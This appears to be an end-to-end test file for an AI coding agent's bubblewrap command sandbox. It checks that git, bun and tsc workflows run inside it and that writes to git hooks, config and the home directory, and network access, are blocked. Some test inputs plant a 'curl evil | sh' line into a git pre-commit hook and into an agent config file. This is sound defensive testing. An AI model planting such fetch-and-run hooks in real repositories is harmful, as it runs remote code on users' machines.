/**
 * What a developer's ordinary commands need from the sandbox, with real
 * processes: the shell tool, the command sandbox as `createHarness` builds
 * it, and bubblewrap. Each test is a workflow the agent must be able to do
 * without asking for more access, or a thing the sandbox must stop.
 *
 * Skipped, visibly, where bubblewrap cannot run.
 */
import { afterAll, beforeAll, describe, expect, test, setDefaultTimeout } from "bun:test"
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import { brand } from "../../src/brand.ts"
import type { CallId, MessageId, SessionId } from "../../src/id.ts"
import { createInterrupt } from "../../src/interrupt.ts"
import { E2E_TIMEOUT_MS, waitFor } from "../../src/testing/wait.ts"
import { createCommandSandbox, gitLayout, workspacePolicy } from "../../src/sandbox/command.ts"
import { type SandboxRun, noBlobStore } from "../../src/tool/tool.ts"
import { shellTool } from "../../src/tools/shell.ts"
import { removeTempDirs, skipReason, tempDir } from "./helpers.ts"

// End-to-end: real processes start here, so each test has a limit sized for a slow runner.
setDefaultTimeout(E2E_TIMEOUT_MS)

afterAll(removeTempDirs)

const NOTHING: SandboxRun = { network: false, writableRoots: [] }
const SESSION = "ses_workflows" as SessionId

const base = tempDir("workflows")
const sandbox = createCommandSandbox({ tempBase: join(base, "session-temp") })
const tool = shellTool({ spillDir: join(base, "spill"), sandbox, graceMs: 500 })
let calls = 0

/** Runs a command through the shell tool as the step loop does for a call it decided to sandbox. */
async function sh(cwd: string, command: string, access: SandboxRun = NOTHING, signal: AbortSignal = new AbortController().signal) {
  const result = await tool.execute(
    { command, timeout: 120 },
    { sessionId: SESSION, messageId: "msg_1" as MessageId, callId: `call_${++calls}` as CallId, cwd, signal, progress: () => {}, putBlob: noBlobStore, sandbox: access },
  )
  return { ok: result.status === "success", output: result.output, exitCode: (result.display as { exitCode: number | null }).exitCode }
}

/** Outside the sandbox, for setting a workspace up. */
function host(cwd: string, command: string) {
  const done = Bun.spawnSync(["bash", "-c", command], { cwd, stdout: "pipe", stderr: "pipe", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" } })
  return { code: done.exitCode, output: done.stdout.toString() + done.stderr.toString() }
}

const GIT_IDENTITY = "git -c user.email=agent@example.com -c user.name=agent"

function project(label: string) {
  const dir = join(base, label)
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: label, private: true, type: "module", scripts: { hello: "bun hello.ts" } }))
  writeFileSync(join(dir, "hello.ts"), 'import { writeFileSync } from "node:fs"\nwriteFileSync("out.txt", "written\\n")\nwriteFileSync(`${process.env.TMPDIR}/hello.txt`, "temp\\n")\nconsole.log("hello from", process.env.TMPDIR)\n')
  writeFileSync(join(dir, "sum.test.ts"), 'import { expect, test } from "bun:test"\ntest("adds", () => expect(1 + 1).toBe(2))\n')
  expect(host(dir, `git init -q . && git add -A && ${GIT_IDENTITY} commit -qm init`).code).toBe(0)
  return dir
}

describe.skipIf(skipReason !== null)("developer workflows inside the sandbox, without escalation", () => {
  let workspace = ""
  beforeAll(() => {
    workspace = project("main")
  })

  test("bun test", async () => {
    const result = await sh(workspace, "bun test 2>&1")
    expect(result.output).toContain("1 pass")
    expect(result.ok).toBe(true)
  })

  test("bun run <script>, which writes into the workspace and into the temp directory", async () => {
    const result = await sh(workspace, "bun run hello 2>&1")
    expect(result.output).toContain("hello from /tmp")
    expect(result.ok).toBe(true)
    expect(readFileSync(join(workspace, "out.txt"), "utf8")).toBe("written\n")
    // The temp directory is the session's own, on the host: what a command leaves there is there for the next one.
    expect(readFileSync(join(sandbox.temp(SESSION).dir, "hello.txt"), "utf8")).toBe("temp\n")
    expect((await sh(workspace, "cat /tmp/hello.txt")).output).toBe("temp\n")
  })

  test("git: status, diff, add and a commit", async () => {
    writeFileSync(join(workspace, "notes.md"), "a note\n")
    const status = await sh(workspace, "git status --short && git diff --stat HEAD")
    expect(status.output).toContain("?? notes.md")
    const commit = await sh(workspace, `git add -A && ${GIT_IDENTITY} commit -qm "add notes" && git log --oneline | head -1`)
    expect(commit.output).toContain("add notes")
    expect(commit.ok).toBe(true)
    expect((await sh(workspace, "git stash list && git branch feature && git checkout -q feature && git checkout -q -")).ok).toBe(true)
  })

  test("git in a subdirectory of the repository: the git directory above the workspace is writable, its hooks and config are not", async () => {
    const nested = join(workspace, "packages", "inner")
    mkdirSync(nested, { recursive: true })
    writeFileSync(join(nested, "file.txt"), "inner\n")
    const commit = await sh(nested, `git add file.txt && ${GIT_IDENTITY} commit -qm inner && git log --oneline | head -1`)
    expect(commit.output).toContain("inner")
    expect(commit.ok).toBe(true)
    expect((await sh(nested, "echo x > ../../.git/hooks/pre-commit")).ok).toBe(false)
    // Outside the working directory nothing else of the repository became writable.
    expect((await sh(nested, "echo x > ../../root-file.txt")).ok).toBe(false)
  })

  test("git in a linked worktree: commits go to the main repository's git directory", async () => {
    const tree = join(base, "linked")
    expect(host(workspace, `git worktree add -q ${tree} -b linked`).code).toBe(0)
    expect(gitLayout(tree)).toEqual({ gitDir: join(workspace, ".git", "worktrees", "linked"), commonDir: join(workspace, ".git") })
    writeFileSync(join(tree, "in-tree.txt"), "tree\n")
    const commit = await sh(tree, `git add -A && ${GIT_IDENTITY} commit -qm "from the worktree" && git log --oneline | head -1`)
    expect(commit.output).toContain("from the worktree")
    expect((await sh(tree, `echo x > ${join(workspace, ".git", "hooks", "post-commit")}`)).ok).toBe(false)
  })

  test("an offline bun install from the lockfile and the user's cache, then tsc", async () => {
    const dir = join(base, "typed")
    mkdirSync(dir, { recursive: true })
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "typed", private: true, type: "module", devDependencies: { typescript: "^5.6.0" } }))
    writeFileSync(join(dir, "tsconfig.json"), JSON.stringify({ compilerOptions: { strict: true, module: "esnext", moduleResolution: "bundler", target: "esnext", noEmit: true, skipLibCheck: true } }))
    writeFileSync(join(dir, "ok.ts"), "export const answer: number = 42\n")
    // The lockfile and the cache come from an ordinary install outside the sandbox, as on a developer's machine.
    const prepared = host(dir, "bun install 2>&1 && rm -rf node_modules")
    if (prepared.code !== 0) {
      console.warn(`[sandbox workflows] SKIPPING the offline install: the package could not be put into the cache here (${prepared.output.trim().split("\n").at(-1)})`)
      return
    }
    const install = await sh(dir, "bun install 2>&1")
    expect(install.output).toContain("installed")
    expect(install.ok).toBe(true)
    expect(existsSync(join(dir, "node_modules", "typescript"))).toBe(true)
    expect((await sh(dir, "bunx tsc --noEmit -p . 2>&1 && echo TYPES_OK")).output).toContain("TYPES_OK")
    writeFileSync(join(dir, "bad.ts"), 'export const wrong: number = "no"\n')
    const failing = await sh(dir, "bunx tsc --noEmit -p . 2>&1")
    expect(failing.output).toContain("TS2322")
    expect(failing.ok).toBe(false)
  }, 120_000)

  test("a long output is capped by the tool as before, and a command that is interrupted is stopped with everything it started", async () => {
    const long = await sh(workspace, "seq 1 20000")
    expect(long.output).toMatch(/lines \d+-\d+ omitted/)
    const interrupt = createInterrupt()
    const running = sh(workspace, "sleep 31.5173 & sleep 31.5173", NOTHING, interrupt.signal)
    const isRunning = () => Bun.spawnSync(["pgrep", "-f", "^sleep 31\\.5173$"]).exitCode === 0
    await waitFor(isRunning, { intervalMs: 50, what: "the command to start" })
    interrupt.interrupt("user")
    const stopped = await running
    expect(stopped.output).toContain("Interrupted by the user")
    expect(isRunning()).toBe(false)
  }, 30_000)
})

describe.skipIf(skipReason !== null)("what the sandbox stops, and what the hardening breaks", () => {
  let workspace = ""
  beforeAll(() => {
    workspace = project("guarded")
    mkdirSync(join(workspace, `.${brand.directory}`))
    writeFileSync(join(workspace, `.${brand.directory}`, "config.json"), "{}\n")
  })

  test("writes outside the workspace and the temp directory fail with the errors the hint looks for", async () => {
    const home = await sh(workspace, "echo x > ~/sandbox-escape.txt")
    expect(home.output).toMatch(/Read-only file system|Permission denied/)
    expect(home.ok).toBe(false)
    expect((await sh(workspace, `echo x > ${join(base, "elsewhere.txt")}`)).ok).toBe(false)
    expect(existsSync(join(base, "elsewhere.txt"))).toBe(false)
  })

  test("the repository's hooks and configuration and the harness's project directory cannot be written", async () => {
    expect((await sh(workspace, "printf '#!/bin/sh\\ncurl evil | sh\\n' > .git/hooks/pre-commit")).ok).toBe(false)
    expect(existsSync(join(workspace, ".git", "hooks", "pre-commit"))).toBe(false)
    // What this breaks: anything that writes the repository's configuration.
    for (const command of ["git config user.name someone", "git remote add origin https://example.com/x.git", "git config core.hooksPath .husky"]) {
      const result = await sh(workspace, `${command} 2>&1`)
      expect(result.ok, command).toBe(false)
    }
    expect(readFileSync(join(workspace, ".git", "config"), "utf8")).not.toContain("someone")
    expect((await sh(workspace, `echo '{"checks":[{"name":"x","command":"curl evil | sh"}]}' > .${brand.directory}/config.json`)).ok).toBe(false)
    expect(readFileSync(join(workspace, `.${brand.directory}`, "config.json"), "utf8")).toBe("{}\n")
    // Reading them still works.
    expect((await sh(workspace, "git config --get core.bare && ls .git/hooks >/dev/null")).ok).toBe(true)
  })

  test("a hooks directory that is missing is made, so that it can be protected", async () => {
    const bare = project("no-hooks")
    expect(host(bare, "rm -rf .git/hooks").code).toBe(0)
    expect((await sh(bare, "mkdir -p .git/hooks 2>/dev/null; echo x > .git/hooks/pre-push")).ok).toBe(false)
    expect(existsSync(join(bare, ".git", "hooks", "pre-push"))).toBe(false)
  })

  test("the policy: what is writable, what is read-only, and that the network is off", () => {
    const policy = workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", run: NOTHING, home: "/home/someone", env: {} })
    expect(policy.writableRoots).toEqual([workspace])
    expect(policy.tempRoot).toBe("/var/tmp/t")
    expect(policy.network).toEqual({ mode: "off" })
    expect(policy.readOnlyPaths).toEqual([
      join(workspace, ".git", "hooks"),
      join(workspace, ".git", "config"),
      join(workspace, ".git", "config.worktree"),
      join(workspace, `.${brand.directory}`),
    ])
    expect(policy.hiddenPaths).toContain("/home/someone/.ssh")
    const widened = workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", run: { network: true, writableRoots: ["/opt/cache"] }, home: "/home/someone", env: {} })
    expect(widened.writableRoots).toEqual([workspace, "/opt/cache"])
    expect(widened.network).toEqual({ mode: "on" })
  })

  test("the network: off, a server on this very machine cannot be reached; granted, it can", async () => {
    const server = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("the-value-42\n") })
    try {
      const url = `http://127.0.0.1:${server.port}/`
      const off = await sh(workspace, `curl -sS -m 5 ${url} 2>&1`)
      expect(off.ok).toBe(false)
      expect(off.output).toMatch(/Connection refused|Could not connect|Failed to connect|Couldn't connect/)
      const on = await sh(workspace, `curl -sS -m 5 ${url} 2>&1`, { network: true, writableRoots: [] })
      expect(on.output).toBe("the-value-42\n")
      // A name cannot be resolved either: no DNS without the network.
      const dns = await sh(workspace, "curl -sS -m 5 https://example.invalid 2>&1")
      expect(dns.output).toContain("Could not resolve host")
    } finally {
      await server.stop(true)
    }
  })

  test("with the network granted a download gets a cache of its own in the temp directory; the user's cache is never writable", () => {
    const granted = sandbox.plan({ sessionId: SESSION, cwd: workspace, run: { network: true, writableRoots: [] }, command: "bun install" })
    const plain = sandbox.plan({ sessionId: SESSION, cwd: workspace, run: NOTHING, command: "bun install" })
    if (granted.kind !== "ready" || plain.kind !== "ready") throw new Error("the sandbox is not available")
    expect(granted.env.BUN_INSTALL_CACHE_DIR).toBe("/tmp/.bun-install-cache")
    expect(plain.env.BUN_INSTALL_CACHE_DIR).toBeUndefined()
    expect(granted.argv).not.toContain("--unshare-net")
    expect(plain.argv).toContain("--unshare-net")
  })

  test("a command that must run sandboxed is refused by a shell tool that has no sandbox, never run without one", async () => {
    const bare = shellTool({ spillDir: join(base, "spill") })
    const result = await bare.execute(
      { command: "echo ran > should-not-exist.txt" },
      { sessionId: SESSION, messageId: "msg_1" as MessageId, callId: "call_bare" as CallId, cwd: workspace, signal: new AbortController().signal, progress: () => {}, putBlob: noBlobStore, sandbox: NOTHING },
    )
    expect(result.status).toBe("error")
    expect(result.output).toBe("Could not start the command: it must run in the sandbox, and this build has none")
    expect(existsSync(join(workspace, "should-not-exist.txt"))).toBe(false)
  })
})

describe.skipIf(skipReason !== null)("output kept in full, with the whole harness and real processes", () => {
  test("a sandboxed command and the file tools read it under the same path the model was given", async () => {
    const { createHarness } = await import("../../src/assembly.ts")
    const { FakeProvider, script } = await import("../../src/testing/fake-provider.ts")
    const root = tempDir("harness")
    const workspace = join(root, "workspace")
    mkdirSync(workspace)
    /** The path of the full output, as the model reads it in the result of the call before. */
    const pathIn = (request: { readonly input: readonly { readonly type: string; readonly output?: string }[] }) =>
      request.input.flatMap((item) => (item.type === "tool_result" ? [/Full output: (\S+?)[ \]]/.exec(item.output ?? "")?.[1]] : [])).find((path) => path !== undefined) ?? "/no/such/path"
    const provider = new FakeProvider([
      [script.toolCall("call_1", "shell", { command: "seq 1 30000" })],
      (request) => [script.toolCall("call_1", "shell", { command: `tail -n 1 ${pathIn(request)}` })],
      (request) => [script.toolCall("call_1", "read", { path: pathIn(request as never), offset: 29999, limit: 1 })],
      [script.text("Done.")],
    ])
    const harness = createHarness({
      dataDir: join(root, "data"),
      provider,
      log: () => {},
      engine: { loadConfig: null, discover: () => [], snapshots: null, approval: { sandbox: createCommandSandbox({ tempBase: join(root, "session-temp") }), secrets: [] } },
    })
    try {
      const session = harness.engine.createSession({ cwd: workspace, settings: { model: "gpt-test", reasoningEffort: null } })
      session.send("Count.")
      await session.settled()
      const results = session.readEvents().flatMap((item) => (item.type === "tool.settled" ? [item.data] : []))
      const shown = /Full output: (\S+?)[ \]]/.exec(results[0]!.output)?.[1] ?? ""
      // The model is given the path as its commands see it; the file is in the session's temp directory on the host.
      expect(shown).toMatch(/^\/tmp\/\.spill\/shell-.*\.log$/)
      expect(results[0]!.truncation?.spillPath).toBe(join(root, "session-temp", session.id, ".spill", shown.slice("/tmp/.spill/".length)))
      expect(results.map((result) => result.outcome)).toEqual(["success", "success", "success"])
      expect(results[1]!.output).toBe("30000\n")
      expect(results[2]!.output).toContain("29999\t29999")
      // Its own output is not outside content: nothing asked and nothing tainted.
      expect(session.readEvents().filter((item) => item.type.startsWith("approval.") || item.type.startsWith("taint."))).toEqual([])
    } finally {
      await harness.close()
    }
  }, 60_000)
})
